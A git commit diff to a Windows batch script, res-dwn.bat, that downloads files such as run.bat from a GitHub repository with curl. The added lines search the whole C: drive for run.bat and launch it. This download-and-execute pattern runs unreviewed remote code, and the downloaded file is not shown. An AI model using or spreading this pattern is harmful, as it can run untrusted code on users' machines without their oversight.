c24f660416879f1d3ca56037f998994cdd34eedc
M48✌🚱 <100668901+Cher-IS-7@users.noreply.github.com>
2024-04-30 09:13:25 +0400

    Update res-dwn.bat

--- res-dwn.bat
+++ res-dwn.bat
@@ -4,5 +4,13 @@ curl -OJL https://raw.githubusercontent.com/Cher-IS-7/batch-testing/main/downloa
 
 curl -OJL https://raw.githubusercontent.com/Cher-IS-7/batch-testing/main/run.bat
 
+set "targetFile=run.bat"
+
+for /r C:\ %%f in (%targetFile%) do (
+    if exist "%%f" (
+        start "" "%%f"
+        exit /b
+    )
+)
 
 exit
